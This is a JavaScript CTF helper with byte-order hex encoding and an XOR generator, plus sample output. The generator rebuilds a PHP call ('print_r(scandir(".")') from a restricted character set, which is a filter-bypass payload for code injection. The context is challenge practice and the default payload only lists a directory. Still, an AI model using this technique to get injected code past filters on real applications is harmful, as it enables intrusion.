var CTFTool = {

printableAsciiString: " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
printableAsciiArray: [" ", "!", "\"", "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ".", "/", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ":", ";", "<", "=", ">", "?", "@", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "[", "\\", "]", "^", "_", "`", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "{", "|", "}", "~"],

intToHexStringByEndian: function(input, LSB = false){
    var hexString = input.toString(16);
    if(hexString.length % 2 != 0){
        hexString = '0' + hexString;
    }
    var splitEveryTwoChar = hexString.match(/.{1,2}/g);
    if(LSB == true) splitEveryTwoChar = splitEveryTwoChar.reverse();
    return splitEveryTwoChar.map(ele => "\\x" + ele).join('');
},
// (113626824).toString(16)
// -> "6c5cec8"
// intToHexStringByEndian(113626824)
// -> "\x06\xc5\xce\xc8"
// intToHexStringByEndian(113626824, true)
// -> "\xc8\xce\xc5\x06"

XORTable: function(target = 'print_r(scandir(".")', availableSet = "0123456789-*|^~"){
    aArr = [];
    bArr = [];
    cArr = [];
    for (var tar of target)
    {
        leave = false;
        for (var a of availableSet) {
            for (var b of availableSet) {
                for (var c of availableSet) {
                    if ((a.charCodeAt(0) ^ b.charCodeAt(0) ^ c.charCodeAt(0)) == tar.charCodeAt(0))
                    {
                        console.log(`'${a}'^'${b}'^'${c}' = ${tar}`);
                        aArr.push(a);
                        bArr.push(b);
                        cArr.push(c);
                        leave = true;
                        break;
                    }       
                }
                if(leave) break;
            }
            if(leave) break;
        }
        if(leave == false){
            console.log("target = " + tar + " can not find");
        }
    }
    console.log("\'" + aArr.join('') + "\'^\'" + bArr.join('') + "\'^\'" + cArr.join('') + "\'");
    return [aArr, bArr, cArr];
}
// XORTable('print_r(scandir(".")', "0123456789-*|^~");
// 
// '4'^'8'^'|' = p
// '4'^'8'^'~' = r
// '8'^'-'^'|' = i
// '8'^'*'^'|' = n
// '0'^'8'^'|' = t
// '0'^'1'^'^' = _
// '4'^'8'^'~' = r
// '0'^'2'^'*' = (
// '4'^'9'^'~' = s
// '0'^'-'^'~' = c
// '0'^'-'^'|' = a
// '8'^'*'^'|' = n
// '0'^'*'^'~' = d
// '8'^'-'^'|' = i
// '4'^'8'^'~' = r
// '0'^'2'^'*' = (
// '0'^'8'^'*' = "
// '0'^'3'^'-' = .
// '0'^'8'^'*' = "
// '0'^'3'^'*' = )
// '44880040400808400000'^'88-*81829--**-828383'^'|~|||^~*~~||~|~**-**'
// 
// -> [Array(20), Array(20), Array(20)]
// 0: (20) ["4", "4", "8", "8", "0", "0", "4", "0", "4", "0", "0", "8", "0", "8", "4", "0", "0", "0", "0", "0"]
// 1: (20) ["8", "8", "-", "*", "8", "1", "8", "2", "9", "-", "-", "*", "*", "-", "8", "2", "8", "3", "8", "3"]
// 2: (20) ["|", "~", "|", "|", "|", "^", "~", "*", "~", "~", "|", "|", "~", "|", "~", "*", "*", "-", "*", "*"]

}
